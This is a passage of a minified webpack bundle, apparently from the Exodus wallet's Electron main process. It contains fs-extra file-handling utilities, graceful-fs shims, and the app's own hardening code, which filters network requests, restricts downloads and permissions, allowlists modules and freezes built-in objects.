							if (!s) return r ? n(s = r) : void(0 == --c && t.rmdir(e, n))
						})
					})
				})
			}(e, t, r)
		})
	}

	function p(e, t) {
		let n;
		c(t = t || {}), i(e, "rimraf: missing path"), i.strictEqual(typeof e, "string", "rimraf: path should be a string"), i(t, "rimraf: missing options"), i.strictEqual(typeof t, "object", "rimraf: options should be object");
		try {
			n = t.lstatSync(e)
		} catch (n) {
			if ("ENOENT" === n.code) return;
			"EPERM" === n.code && s && f(e, t, n)
		}
		try {
			n && n.isDirectory() ? h(e, t, null) : t.unlinkSync(e)
		} catch (n) {
			if ("ENOENT" === n.code) return;
			if ("EPERM" === n.code) return s ? f(e, t, n) : h(e, t, n);
			if ("EISDIR" !== n.code) throw n;
			h(e, t, n)
		}
	}

	function h(e, t, n) {
		i(e), i(t);
		try {
			t.rmdirSync(e)
		} catch (r) {
			if ("ENOTDIR" === r.code) throw n;
			if ("ENOTEMPTY" === r.code || "EEXIST" === r.code || "EPERM" === r.code) ! function(e, t) {
				if (i(e), i(t), t.readdirSync(e).forEach(n => p(o.join(e, n), t)), !s) {
					const n = t.rmdirSync(e, t);
					return n
				} {
					const n = Date.now();
					do {
						try {
							const n = t.rmdirSync(e, t);
							return n
						} catch {}
					} while (Date.now() - n < 500)
				}
			}(e, t);
			else if ("ENOENT" !== r.code) throw r
		}
	}
	e.exports = a, a.sync = p
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromPromise,
		o = n(43),
		i = n(1),
		s = n(22),
		c = n(50),
		a = r(async function(e) {
			let t;
			try {
				t = await o.readdir(e)
			} catch {
				return s.mkdirs(e)
			}
			return Promise.all(t.map(t => c.remove(i.join(e, t))))
		});

	function u(e) {
		let t;
		try {
			t = o.readdirSync(e)
		} catch {
			return s.mkdirsSync(e)
		}
		t.forEach(t => {
			t = i.join(e, t), c.removeSync(t)
		})
	}
	e.exports = {
		emptyDirSync: u,
		emptydirSync: u,
		emptyDir: a,
		emptydir: a
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(22).mkdirsSync,
		s = n(81).utimesMillisSync,
		c = n(42);

	function a(e, t, n, i) {
		const s = (i.dereference ? r.statSync : r.lstatSync)(t);
		if (s.isDirectory()) return function(e, t, n, o, i) {
			return t ? f(n, o, i) : function(e, t, n, o) {
				return r.mkdirSync(n), f(t, n, o), l(n, e)
			}(e.mode, n, o, i)
		}(s, e, t, n, i);
		if (s.isFile() || s.isCharacterDevice() || s.isBlockDevice()) return function(e, t, n, o, i) {
			return t ? function(e, t, n, o) {
				if (o.overwrite) return r.unlinkSync(n), u(e, t, n, o);
				if (o.errorOnExist) throw new Error(`'${n}' already exists`)
			}(e, n, o, i) : u(e, n, o, i)
		}(s, e, t, n, i);
		if (s.isSymbolicLink()) return function(e, t, n, i) {
			let s = r.readlinkSync(t);
			i.dereference && (s = o.resolve(process.cwd(), s));
			if (e) {
				let e;
				try {
					e = r.readlinkSync(n)
				} catch (e) {
					if ("EINVAL" === e.code || "UNKNOWN" === e.code) return r.symlinkSync(s, n);
					throw e
				}
				if (i.dereference && (e = o.resolve(process.cwd(), e)), c.isSrcSubdir(s, e)) throw new Error(`Cannot copy '${s}' to a subdirectory of itself, '${e}'.`);
				if (r.statSync(n).isDirectory() && c.isSrcSubdir(e, s)) throw new Error(`Cannot overwrite '${e}' with '${s}'.`);
				return function(e, t) {
					return r.unlinkSync(t), r.symlinkSync(e, t)
				}(s, n)
			}
			return r.symlinkSync(s, n)
		}(e, t, n, i);
		if (s.isSocket()) throw new Error(`Cannot copy a socket file: ${t}`);
		if (s.isFIFO()) throw new Error(`Cannot copy a FIFO pipe: ${t}`);
		throw new Error(`Unknown file: ${t}`)
	}

	function u(e, t, n, o) {
		return r.copyFileSync(t, n), o.preserveTimestamps && function(e, t, n) {
			(function(e) {
				return 0 == (128 & e)
			})(e) && function(e, t) {
				l(e, 128 | t)
			}(n, e);
			(function(e, t) {
				const n = r.statSync(e);
				s(t, n.atime, n.mtime)
			})(t, n)
		}(e.mode, t, n), l(n, e.mode)
	}

	function l(e, t) {
		return r.chmodSync(e, t)
	}

	function f(e, t, n) {
		r.readdirSync(e).forEach(r => (function(e, t, n, r) {
			const i = o.join(t, e),
				s = o.join(n, e),
				{
					destStat: u
				} = c.checkPathsSync(i, s, "copy", r);
			return function(e, t, n, r) {
				if (!r.filter || r.filter(t, n)) return a(e, t, n, r)
			}(u, i, s, r)
		})(r, e, t, n))
	}
	e.exports = function(e, t, n) {
		"function" == typeof n && (n = {
			filter: n
		}), (n = n || {}).clobber = !("clobber" in n && !n.clobber), n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber, n.preserveTimestamps && "ia32" === process.arch && process.emitWarning("Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269", "Warning", "fs-extra-WARN0002");
		const {
			srcStat: s,
			destStat: u
		} = c.checkPathsSync(e, t, "copy", n);
		return c.checkParentPathsSync(e, s, t, "copy"),
			function(e, t, n, s) {
				if (s.filter && !s.filter(t, n)) return;
				const c = o.dirname(n);
				return r.existsSync(c) || i(c), a(e, t, n, s)
			}(u, e, t, n)
	}
}, function(e, t, n) {
	"use strict";
	const r = n(1);
	e.exports.checkPath = function(e) {
		if ("win32" === process.platform) {
			if (/[<>:"|?*]/.test(e.replace(r.parse(e).root, ""))) {
				const t = new Error(`Path contains invalid characters: ${e}`);
				throw t.code = "EINVAL", t
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(43),
		{
			checkPath: o
		} = n(174),
		i = e => {
			return "number" == typeof e ? e : {
				...{
					mode: 511
				},
				...e
			}.mode
		};
	e.exports.makeDir = (async (e, t) => (o(e), r.mkdir(e, {
		mode: i(t),
		recursive: !0
	}))), e.exports.makeDirSync = ((e, t) => (o(e), r.mkdirSync(e, {
		mode: i(t),
		recursive: !0
	})))
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(22).mkdirs,
		s = n(36).pathExists,
		c = n(81).utimesMillis,
		a = n(42);

	function u(e, t, n, r, c) {
		const a = o.dirname(n);
		s(a, (o, s) => o ? c(o) : s ? f(e, t, n, r, c) : void i(a, o => o ? c(o) : f(e, t, n, r, c)))
	}

	function l(e, t, n, r, o, i) {
		Promise.resolve(o.filter(n, r)).then(s => s ? e(t, n, r, o, i) : i(), e => i(e))
	}

	function f(e, t, n, o, i) {
		(o.dereference ? r.stat : r.lstat)(t, (s, c) => s ? i(s) : c.isDirectory() ? function(e, t, n, o, i, s) {
			return t ? y(n, o, i, s) : function(e, t, n, o, i) {
				r.mkdir(n, r => {
					if (r) return i(r);
					y(t, n, o, t => t ? i(t) : h(n, e, i))
				})
			}(e.mode, n, o, i, s)
		}(c, e, t, n, o, i) : c.isFile() || c.isCharacterDevice() || c.isBlockDevice() ? function(e, t, n, o, i, s) {
			return t ? function(e, t, n, o, i) {
				if (!o.overwrite) return o.errorOnExist ? i(new Error(`'${n}' already exists`)) : i();
				r.unlink(n, r => r ? i(r) : d(e, t, n, o, i))
			}(e, n, o, i, s) : d(e, n, o, i, s)
		}(c, e, t, n, o, i) : c.isSymbolicLink() ? w(e, t, n, o, i) : c.isSocket() ? i(new Error(`Cannot copy a socket file: ${t}`)) : c.isFIFO() ? i(new Error(`Cannot copy a FIFO pipe: ${t}`)) : i(new Error(`Unknown file: ${t}`)))
	}

	function d(e, t, n, o, i) {
		r.copyFile(t, n, r => r ? i(r) : o.preserveTimestamps ? function(e, t, n, r) {
			if (function(e) {
					return 0 == (128 & e)
				}(e)) return function(e, t, n) {
				return h(e, 128 | t, n)
			}(n, e, o => o ? r(o) : p(e, t, n, r));
			return p(e, t, n, r)
		}(e.mode, t, n, i) : h(n, e.mode, i))
	}

	function p(e, t, n, o) {
		! function(e, t, n) {
			r.stat(e, (e, r) => e ? n(e) : c(t, r.atime, r.mtime, n))
		}(t, n, t => t ? o(t) : h(n, e, o))
	}

	function h(e, t, n) {
		return r.chmod(e, t, n)
	}

	function y(e, t, n, o) {
		r.readdir(e, (r, i) => r ? o(r) : m(i, e, t, n, o))
	}

	function m(e, t, n, r, i) {
		const s = e.pop();
		return s ? function(e, t, n, r, i, s) {
			const c = o.join(n, t),
				u = o.join(r, t);
			a.checkPaths(c, u, "copy", i, (t, o) => {
				if (t) return s(t);
				const {
					destStat: a
				} = o;
				! function(e, t, n, r, o) {
					r.filter ? l(f, e, t, n, r, o) : f(e, t, n, r, o)
				}(a, c, u, i, t => t ? s(t) : m(e, n, r, i, s))
			})
		}(e, s, t, n, r, i) : i()
	}

	function w(e, t, n, i, s) {
		r.readlink(t, (t, c) => t ? s(t) : (i.dereference && (c = o.resolve(process.cwd(), c)), e ? void r.readlink(n, (t, u) => t ? "EINVAL" === t.code || "UNKNOWN" === t.code ? r.symlink(c, n, s) : s(t) : (i.dereference && (u = o.resolve(process.cwd(), u)), a.isSrcSubdir(c, u) ? s(new Error(`Cannot copy '${c}' to a subdirectory of itself, '${u}'.`)) : e.isDirectory() && a.isSrcSubdir(u, c) ? s(new Error(`Cannot overwrite '${u}' with '${c}'.`)) : function(e, t, n) {
			r.unlink(t, o => o ? n(o) : r.symlink(e, t, n))
		}(c, n, s))) : r.symlink(c, n, s)))
	}
	e.exports = function(e, t, n, r) {
		"function" != typeof n || r ? "function" == typeof n && (n = {
			filter: n
		}) : (r = n, n = {}), r = r || function() {}, (n = n || {}).clobber = !("clobber" in n && !n.clobber), n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber, n.preserveTimestamps && "ia32" === process.arch && process.emitWarning("Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269", "Warning", "fs-extra-WARN0001"), a.checkPaths(e, t, "copy", n, (o, i) => {
			if (o) return r(o);
			const {
				srcStat: s,
				destStat: c
			} = i;
			a.checkParentPaths(e, s, t, "copy", o => o ? r(o) : n.filter ? l(u, c, e, t, n, r) : u(c, e, t, n, r))
		})
	}
}, function(e, t, n) {
	"use strict";
	e.exports = function(e) {
		if (null === e || "object" != typeof e) return e;
		if (e instanceof Object) var t = {
			__proto__: r(e)
		};
		else var t = Object.create(null);
		return Object.getOwnPropertyNames(e).forEach(function(n) {
			Object.defineProperty(t, n, Object.getOwnPropertyDescriptor(e, n))
		}), t
	};
	var r = Object.getPrototypeOf || function(e) {
		return e.__proto__
	}
}, function(e, t, n) {
	var r = n(51).Stream;
	e.exports = function(e) {
		return {
			ReadStream: function t(n, o) {
				if (!(this instanceof t)) return new t(n, o);
				r.call(this);
				var i = this;
				this.path = n;
				this.fd = null;
				this.readable = !0;
				this.paused = !1;
				this.flags = "r";
				this.mode = 438;
				this.bufferSize = 65536;
				o = o || {};
				var s = Object.keys(o);
				for (var c = 0, a = s.length; c < a; c++) {
					var u = s[c];
					this[u] = o[u]
				}
				this.encoding && this.setEncoding(this.encoding);
				if (void 0 !== this.start) {
					if ("number" != typeof this.start) throw TypeError("start must be a Number");
					if (void 0 === this.end) this.end = 1 / 0;
					else if ("number" != typeof this.end) throw TypeError("end must be a Number");
					if (this.start > this.end) throw new Error("start must be <= end");
					this.pos = this.start
				}
				if (null !== this.fd) return void process.nextTick(function() {
					i._read()
				});
				e.open(this.path, this.flags, this.mode, function(e, t) {
					if (e) return i.emit("error", e), void(i.readable = !1);
					i.fd = t, i.emit("open", t), i._read()
				})
			},
			WriteStream: function t(n, o) {
				if (!(this instanceof t)) return new t(n, o);
				r.call(this);
				this.path = n;
				this.fd = null;
				this.writable = !0;
				this.flags = "w";
				this.encoding = "binary";
				this.mode = 438;
				this.bytesWritten = 0;
				o = o || {};
				var i = Object.keys(o);
				for (var s = 0, c = i.length; s < c; s++) {
					var a = i[s];
					this[a] = o[a]
				}
				if (void 0 !== this.start) {
					if ("number" != typeof this.start) throw TypeError("start must be a Number");
					if (this.start < 0) throw new Error("start must be >= zero");
					this.pos = this.start
				}
				this.busy = !1;
				this._queue = [];
				null === this.fd && (this._open = e.open, this._queue.push([this._open, this.path, this.flags, this.mode, void 0]), this.flush())
			}
		}
	}
}, function(e, t) {
	e.exports = require("constants")
}, function(e, t, n) {
	var r = n(179),
		o = process.cwd,
		i = null,
		s = process.platform;
	process.cwd = function() {
		return i || (i = o.call(process)), i
	};
	try {
		process.cwd()
	} catch (e) {}
	if ("function" == typeof process.chdir) {
		var c = process.chdir;
		process.chdir = function(e) {
			i = null, c.call(process, e)
		}, Object.setPrototypeOf && Object.setPrototypeOf(process.chdir, c)
	}
	e.exports = function(e) {
		r.hasOwnProperty("O_SYMLINK") && process.version.match(/^v0\.6\.[0-2]|^v0\.5\./) && function(e) {
			e.lchmod = function(t, n, o) {
				e.open(t, r.O_WRONLY | r.O_SYMLINK, n, function(t, r) {
					t ? o && o(t) : e.fchmod(r, n, function(t) {
						e.close(r, function(e) {
							o && o(t || e)
						})
					})
				})
			}, e.lchmodSync = function(t, n) {
				var o, i = e.openSync(t, r.O_WRONLY | r.O_SYMLINK, n),
					s = !0;
				try {
					o = e.fchmodSync(i, n), s = !1
				} finally {
					if (s) try {
						e.closeSync(i)
					} catch (e) {} else e.closeSync(i)
				}
				return o
			}
		}(e);
		e.lutimes || function(e) {
			r.hasOwnProperty("O_SYMLINK") && e.futimes ? (e.lutimes = function(t, n, o, i) {
				e.open(t, r.O_SYMLINK, function(t, r) {
					t ? i && i(t) : e.futimes(r, n, o, function(t) {
						e.close(r, function(e) {
							i && i(t || e)
						})
					})
				})
			}, e.lutimesSync = function(t, n, o) {
				var i, s = e.openSync(t, r.O_SYMLINK),
					c = !0;
				try {
					i = e.futimesSync(s, n, o), c = !1
				} finally {
					if (c) try {
						e.closeSync(s)
					} catch (e) {} else e.closeSync(s)
				}
				return i
			}) : e.futimes && (e.lutimes = function(e, t, n, r) {
				r && process.nextTick(r)
			}, e.lutimesSync = function() {})
		}(e);
		e.chown = o(e.chown), e.fchown = o(e.fchown), e.lchown = o(e.lchown), e.chmod = t(e.chmod), e.fchmod = t(e.fchmod), e.lchmod = t(e.lchmod), e.chownSync = i(e.chownSync), e.fchownSync = i(e.fchownSync), e.lchownSync = i(e.lchownSync), e.chmodSync = n(e.chmodSync), e.fchmodSync = n(e.fchmodSync), e.lchmodSync = n(e.lchmodSync), e.stat = c(e.stat), e.fstat = c(e.fstat), e.lstat = c(e.lstat), e.statSync = a(e.statSync), e.fstatSync = a(e.fstatSync), e.lstatSync = a(e.lstatSync), e.chmod && !e.lchmod && (e.lchmod = function(e, t, n) {
			n && process.nextTick(n)
		}, e.lchmodSync = function() {});
		e.chown && !e.lchown && (e.lchown = function(e, t, n, r) {
			r && process.nextTick(r)
		}, e.lchownSync = function() {});
		"win32" === s && (e.rename = "function" != typeof e.rename ? e.rename : function(t) {
			function n(n, r, o) {
				var i = Date.now(),
					s = 0;
				t(n, r, function c(a) {
					if (a && ("EACCES" === a.code || "EPERM" === a.code) && Date.now() - i < 6e4) return setTimeout(function() {
						e.stat(r, function(e, i) {
							e && "ENOENT" === e.code ? t(n, r, c) : o(a)
						})
					}, s), void(s < 100 && (s += 10));
					o && o(a)
				})
			}
			return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n
		}(e.rename));

		function t(t) {
			return t ? function(n, r, o) {
				return t.call(e, n, r, function(e) {
					u(e) && (e = null), o && o.apply(this, arguments)
				})
			} : t
		}

		function n(t) {
			return t ? function(n, r) {
				try {
					return t.call(e, n, r)
				} catch (e) {
					if (!u(e)) throw e
				}
			} : t
		}

		function o(t) {
			return t ? function(n, r, o, i) {
				return t.call(e, n, r, o, function(e) {
					u(e) && (e = null), i && i.apply(this, arguments)
				})
			} : t
		}

		function i(t) {
			return t ? function(n, r, o) {
				try {
					return t.call(e, n, r, o)
				} catch (e) {
					if (!u(e)) throw e
				}
			} : t
		}

		function c(t) {
			return t ? function(n, r, o) {
				function i(e, t) {
					t && (t.uid < 0 && (t.uid += 4294967296), t.gid < 0 && (t.gid += 4294967296)), o && o.apply(this, arguments)
				}
				return "function" == typeof r && (o = r, r = null), r ? t.call(e, n, r, i) : t.call(e, n, i)
			} : t
		}

		function a(t) {
			return t ? function(n, r) {
				var o = r ? t.call(e, n, r) : t.call(e, n);
				return o && (o.uid < 0 && (o.uid += 4294967296), o.gid < 0 && (o.gid += 4294967296)), o
			} : t
		}

		function u(e) {
			if (!e) return !0;
			if ("ENOSYS" === e.code) return !0;
			var t = !process.getuid || 0 !== process.getuid();
			return !(!t || "EINVAL" !== e.code && "EPERM" !== e.code)
		}
		e.read = "function" != typeof e.read ? e.read : function(t) {
			function n(n, r, o, i, s, c) {
				var a;
				if (c && "function" == typeof c) {
					var u = 0;
					a = function(l, f, d) {
						if (l && "EAGAIN" === l.code && u < 10) return u++, t.call(e, n, r, o, i, s, a);
						c.apply(this, arguments)
					}
				}
				return t.call(e, n, r, o, i, s, a)
			}
			return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n
		}(e.read), e.readSync = "function" != typeof e.readSync ? e.readSync : (l = e.readSync, function(t, n, r, o, i) {
			for (var s = 0;;) try {
				return l.call(e, t, n, r, o, i)
			} catch (e) {
				if ("EAGAIN" === e.code && s < 10) {
					s++;
					continue
				}
				throw e
			}
		});
		var l
	}
}, function(e, t, n) {
	"use strict";
	n.r(t);
	var r = n(0),
		o = n(45),
		i = n.n(o),
		s = n(1),
		c = n.n(s),
		a = n(13),
		u = n(2),
		l = n(34),
		f = n(6),
		d = n(41);
	const p = u.g ? "./" : "src/",
		h = c.a.join(r.app.getAppPath(), p),
		y = Object(l.b)(),
		m = i()(process.argv);

	function w(e, {
		prefix: t,
		mimetypes: n
	}) {
		return e.getURL().startsWith(t) && n.includes(e.getMimeType())
	}
	const [b, g, v, E] = [1, 2, 3, 4];

	function S(e, t) {
		const n = Object(d.a)(e, t);
		if (!n) return v;
		if ("block_silent" === n) return E;
		const {
			protocols: r,
			domains: o
		} = n, {
			protocol: i,
			hostname: s,
			pathname: l
		} = t, f = ["http:", "ws:"].includes(i), p = ["localhost", "127.0.0.1"].includes(s);
		if (f && !p) return v;
		const w = "file:" === i,
			g = ["exodus-dapp-api:", "exodus-nfts-api:"].includes(i),
			S = ["devtools:", "chrome-extension:"].includes(i),
			k = ["https:", "wss:", "file:", "exodus-dapp-api:", "exodus-nfts-api:"].includes(i);
		if (w && ! function(e) {
				const t = Object(a.fileURLToPath)(e),
					n = c.a.relative(h, t);
				if (!u.e && n.includes("..")) return !1;
				const r = c.a.resolve(t),
					o = [h, y];
				return u.e && m.datadir && o.push(m.datadir), o.some(e => r.startsWith(e))
			}(t)) return l.endsWith(".map") ? E : v;
		if (S) return b;
		if ("*" !== r) {
			if (!(p && f && r.includes("localhost") || k && r.includes(i))) return v
		}
		if ("*" !== o && !w && !g) {
			const e = function(e) {
				return e.port ? parseInt(e.port, 10) : ["https:", "wss:"].includes(e.protocol) ? 443 : ["http:", "ws:"].includes(e.protocol) ? 80 : null
			}(t);
			if (!(443 === e && o.includes(`${s}`) || e && o.includes(`${s}:${e}`) || o.includes(`${s}:*`))) return v
		}
		return b
	}
	const k = new WeakSet;

	function x(e) {
		if (k.has(e)) return;
		k.add(e), e.setSSLConfig({
			minVersion: "tls1.2"
		});
		const {
			webRequest: t
		} = e;
		t.onBeforeRequest((t, n) => {
			const r = new a.URL(t.url),
				o = S(e, r),
				i = {};
			o === b || o === g && u.f || (i.cancel = !0, o !== E && Object(f.a)("network request", ` to ${r.toString()}`)), n(i)
		}), e.on("will-download", (e, t, n) => {
			try {
				if (function(e, t) {
						const {
							downloads: n
						} = Object(d.b)(t.session);
						for (const t of n)
							if (w(e, t)) return !0 === t.open && e.once("done", () => {
								r.shell.openPath(e.getSavePath())
							}), !0;
						if (t.getURL().startsWith("devtools://") && w(e, {
								prefix: "blob:devtools://",
								mimetypes: ["image/png"]
							})) return !0;
						return !1
					}(t, n)) return
			} catch (e) {}
			e.preventDefault(), Object(f.a)("download attempt")
		}), e.setPermissionRequestHandler((e, t, n, r) => {
			return n(C(e, t, r))
		}), e.setPermissionCheckHandler((e, t, n, r) => {
			return C(e, t, r)
		}), e.setSpellCheckerLanguages([])
	}
	const O = ["accessibility-events", "window-placement"];

	function C(e, t, n) {
		const r = function(e, t, n) {
			if (!e) return !1;
			if (!n.isMainFrame) return !1;
			const {
				permissions: r
			} = Object(d.b)(e.session);
			return r.includes(t)
		}(e, t, n);
		return r || O.includes(t) || Object(f.a)("unexpected permission request", ` to ${t}`), r
	}
	r.app.on("ready", () => {
		x(r.session.defaultSession)
	}), r.app.on("session-created", e => {
		x(e)
	})
}, function(e, t, n) {
	const {
		app: r
	} = n(0);
	if (r.isReady()) throw new Error("Electron security must be imported before the app is ready");
	n(181), n(8)
}, function(e, t, n) {
	"use strict";
	n.r(t), n.d(t, "isBuiltinModule", function() {
		return i
	}), n.d(t, "allowedBuiltins", function() {
		return s
	});
	var r = n(52);
	const o = Function.prototype.call.bind(Array.prototype.includes),
		i = e => !e.endsWith("/") && (e => "electron" === e || o(r.builtinModules, e))(e.replace(/\/.*/, "")),
		s = e => {
			const t = ["electron", "module"];
			switch (e) {
				case "main":
					return [...t, "child_process", "tty", "crypto", "assert", "buffer", "constants", "events", "fs", "fs/promises", "os", "path", "stream", "url", "util", "zlib", ...[]];
				case "monero":
					return [...t, "crypto", "buffer", "util", "stream"];
				case "core":
					return [...t, "crypto", "assert", "constants", "fs", "os", "path", "stream", "util", "zlib"];
				case "wallet":
					return [...t, "crypto", "assert", "buffer", "constants", "events", "fs", "os", "path", "stream", "url", "util", "zlib"];
				case "ui":
					return [...t, "crypto", "assert", "buffer", "constants", "events", "fs", "http", "https", "net", "os", "path", "querystring", "readline", "stream", "tls", "url", "util", "zlib"]
			}
			return []
		}
}, function(e, t, n) {
	"use strict";
	e.exports = {
		getProcessName: function() {
			return "main"
		}
	}
}, function(e, t, n) {
	if (void 0 !== globalThis.Buffer && globalThis.Buffer) {
		const Buffer = globalThis.Buffer;
		Buffer.poolSize = 0, Buffer.allocUnsafe = function(e) {
			return Buffer.alloc(e)
		}, Buffer.allocUnsafeSlow = Buffer.allocUnsafe, Object.freeze(Buffer)
	}
	const r = Object.getPrototypeOf(Int8Array);
	for (const e of [...[Object, Array, Number, String, Function, Set, Map, WeakSet, WeakMap], ...[Reflect, TypeError, BigInt, URL, Date, JSON, Math], ...[Int8Array, Int16Array, Int32Array, DataView], ...[Uint8Array, Uint16Array, Uint32Array, r]]) Object.freeze(e);
	"undefined" != typeof crypto && crypto && crypto.subtle && (Object.freeze(crypto), Object.freeze(crypto.subtle)); {
		const e = n(52),
			t = () => {
				throw new Error("require() of non-builtins has been disabled")
			};
		e._findPath = t;
		for (const n of Object.keys(e._extensions)) e._extensions[n] = t
	} {
		const e = n(52),
			t = Function.prototype.call.bind(Array.prototype.includes),
			r = [...e.builtinModules],
			o = e => "electron" === e || t(r, e),
			i = e => !e.endsWith("/") && o(e.replace(/\/.*/, "")),
			s = () => {
				const {
					getProcessName: e
				} = n(184), {
					allowedBuiltins: t
				} = n(183), r = e();
				return {
					processName: r,
					allowedModules: [...t(r)]
				}
			},
			{
				processName: c,
				allowedModules: a
			} = s(),
			u = (e, n) => {
				if (i(e), "module" !== e && t(a, e)) return;
				throw new Error(`Requiring module "${e}" is not allowed` + ` in browser process "${c}" (parent: ${n})`)
			},
			l = e._resolveFilename.bind(e);
		e._resolveFilename = ((e, t, ...n) => (u(e, t.id), l(e, t, ...n)))
	}
	process.binding && (process.binding = (e => {
		throw new Error(`harden: process.binding(${JSON.stringify(e)}) has been disabled`)
	}))
}, function(e, t) {
	const n = (...e) => {
		const t = e.reduce((e, t) => e.concat((e => e instanceof Error && e.stack)(t) ? t.stack : t, "\n"), "").trim();
		console._errorOriginal(t)
	};
	console._errorOriginal || (console._errorOriginal = console.error.bind(console), console.error = n)
}, function(e, t, n) {
	n(186), n(185)
}, function(e, t, n) {
	const r = n(27),
		{
			format: o
		} = n(32),
		i = n(1),
		s = n(33);
	if (process.argv.includes("--eden-full-log-to-file")) {
		process.env.ELECTRON_ENABLE_LOGGING = 1;
		const e = i.join(s.homedir(), `exodus.${Date.now()}.log`),
			t = process.pid;
		let n = !0;
		const c = ({
			...o
		}) => {
			const i = JSON.stringify({
				time: (new Date).toISOString(),
				pid: t,
				...o
			});
			r.appendFileSync(e, `${i}\n`), n && (r.chmodSync(e, 384), n = !1)
		};
		for (const e of ["log", "warn", "error", "info", "debug"]) {
			const t = console[e].bind(console);
			console[e] = ((...n) => {
				t(...n);
				const r = {
						level: "log" === e ? "info" : e,
						name: "browser",
						message: o(...n)
					},
					i = (((new Error).stack || "").split("\n")[2] || "").trim().match(/\((.*):([0-9]+):([0-9]+)\)$/);
				i && Object.assign(r, {
					source: i[1],
					line: Number(i[2]),
					column: Number(i[3])
				}), c(r)
			})
		}
		globalThis.EDEN_LOG_TO_FILE = {
			log: c
		}, console.log(`Logs are forwarded to ${e}`)
	}
}, function(e, t, n) {
	2 === process.argv.length && "--version" === process.argv[1] && (console.log(n(66).version), n(0).app.exit(0)), console.time("main"), console.log("ENV: production"), n(21).instantEvent("didStartMain"), n(187), n(182), n(20), n(102)
}]);